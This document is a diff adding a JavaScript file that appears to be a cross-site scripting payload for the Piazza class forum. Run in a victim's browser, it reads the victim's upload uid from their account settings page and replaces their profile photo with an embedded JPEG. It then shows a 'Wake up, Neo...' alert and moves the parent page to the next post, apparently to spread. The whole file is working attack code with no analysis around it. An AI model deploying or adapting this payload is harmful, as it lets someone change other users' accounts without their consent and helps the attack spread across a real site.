@@ -1,0 +1,44 @@
+function makeImageBlob() {
+        var image64 = "/9j/4AAQSkZJRgABAQEASABIAAD//gATQ3JlYXRlZCB3aXRoIEdJTVD/2wBDABkRExYTEBkWFBYcGxkeJT4pJSIiJUw3Oi0+WlBfXllQV1ZkcJB6ZGqIbFZXfap+iJSZoaKhYXiwva+cu5CeoZr/2wBDARscHCUhJUkpKUmaZ1dnmpqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampr/wgARCABAAEADAREAAhEBAxEB/8QAGQAAAwEBAQAAAAAAAAAAAAAAAgQFAwEA/8QAFwEBAQEBAAAAAAAAAAAAAAAAAAECA//aAAwDAQACEAMQAAABmSdrSVkMQPIznCe+nSllQU7F5YWo5jmnvfZWihKNgkmm+fJHp1MEoyz7DhgPHKf066xQl6O0MAS3PC62CaMowKKVjnmvre+cjrbkuwuitmmcYXXUK70AM7DDxj//xAAkEAACAgEEAgEFAAAAAAAAAAABAgARAxITITEEECIUMjNBQv/aAAgBAQABBQIy+Exl59M0Pi8MhQ3wrGvWIwesq6kgvRDEyKIuRSD5OMTeR5/QU1D6wJaEUUUu23eQ3pgmPTpwuqj4tCQIFnY/S/YD8ce2IrJR7y5SIANFQVURXhFQvzmNstaD1AeN0iNmZoI/Q/H/AP/EAB0RAAEDBQEAAAAAAAAAAAAAADABESAAECExQUD/2gAIAQMBAT8BmwFA/g7Z8y6BdgXdf//EABoRAAICAwAAAAAAAAAAAAAAAAEwAEERIFD/2gAIAQIBAT8B3wg8C0FFz//EACAQAAIDAAIBBQAAAAAAAAAAAAABEBEhAiAiEjFRcaH/2gAIAQEABj8Cn3Memws7OFOzS/YT6c0UykcvhC2bodsuk49Vi+4ZR5M8YfEXTGi60qNhlPqj/8QAIBABAAMAAgIDAQEAAAAAAAAAAQARIUFREDFhcaGBwf/aAAgBAQABPyFXXcsV7jWeu48QZ3eKoahqROrJU6lUXgwJvE5qdXB25hg4BlqEnIL9EqKIsf68naD68XJi5EYKSGIXXvtwjQHKvAycAz4nJKwNnSamAAfUUvG22VmX2lQdtyae8PN/EUBlHqvAV6L5+Imx5ig+pp/Ig10zHUIOgpzOW2aHfqUB0XBqFe38g/i+IDxyAV68dl6jHDmf/9oADAMBAAIAAwAAABBnN5yRqqA67keQSPydYbFgTcVK6aTfFQX/xAAcEQADAQADAQEAAAAAAAAAAAAAAREQITFBIDD/2gAIAQMBAT8QSJzchMaGl/CKPoRcutLkxEyCUbv2huNlcMmt+DbFpzRFLnbK6CfI/BaxFD//xAAcEQADAQADAQEAAAAAAAAAAAAAAREQICExMEH/2gAIAQIBAT8QxspSko0vwi7MhMbV4PGXoXuPVrcbxvuH7wQ2xad3hBelUQ8hNY//xAAiEAEAAwACAgICAwAAAAAAAAABABEhMUFRYRBxgZHB0fD/2gAIAQEAAT8Qp2VBWwoKg7fczUPJLGd+o4HA0SiXRp49xAmIkMxhNJ3BKgaTvxr+ZRKKLmJLEhYKFrxAR/YhA8FauVFbuwgPGYS8BOWoVrjneIVQ/wD1zKNWopVv3C6Dz/aAZTuDwfFtfHD8wFaDYh9FS+mo8BVI9QYueXoIoGmzYvdQR2/FZowBPfmawabtFkpWGxXyw0S1qGyAvpgqOAnSdJQUyyAK1ePqAfbqAobKgvJXeo5sv3TixqIPhQXUd+pzCqAVFNKTLltplQE0vZuIOmjZ6c0iB1Cy+4cXhlF1EDkqpTDCBZ18RkqguXioyQsHHEATSzQYQBggUCFNuajmBwCOFlWoHlIN8+4ay90/mFfRXRzP/9k=";
+        var chars = atob(image64);
+        var charArray = new Array(chars.length);
+        for (var i = 0; i < chars.length; i++)
+                charArray[i] = chars.charCodeAt(i);
+        var byteArray = new Uint8Array(charArray);
+        return new Blob([byteArray], { type: "image/jpeg" });
+};
+
+function getUid(callback) {
+        var request = new XMLHttpRequest();
+        request.onload = function () {
+                var uploadUrl = this.responseXML.getElementById("uploadForm")
+                                .getAttribute("action");
+                var uid = uploadUrl.split("uid=")[1];
+                return callback(uid);
+        };
+        request.open("GET", "https://piazza.com/account_settings", true);
+        request.responseType = "document";
+        request.send();
+};
+function changeProfilePhoto(uid, photoBlob, callback) {
+        var request = new XMLHttpRequest();
+        request.onload = callback;
+        request.open("POST", "https://piazza.com/upload/upload_photo?uid=" +
+                        uid, true);
+        var formData = new FormData();
+        formData.append("user[photo]", photoBlob);
+        request.send(formData);
+};
+
+function leave() {
+        var parentUrl = (parent.location + "").split("cid=");
+        var nextPost = (parseInt(parentUrl[1]) + 1) + "";
+        parent.location = parentUrl[0] + "cid=" + nextPost;
+};
+
+getUid(function (uid) {
+        changeProfilePhoto(uid, makeImageBlob(), function () {
+                alert("Wake up, Neo...");
+                leave();
+        });
+});
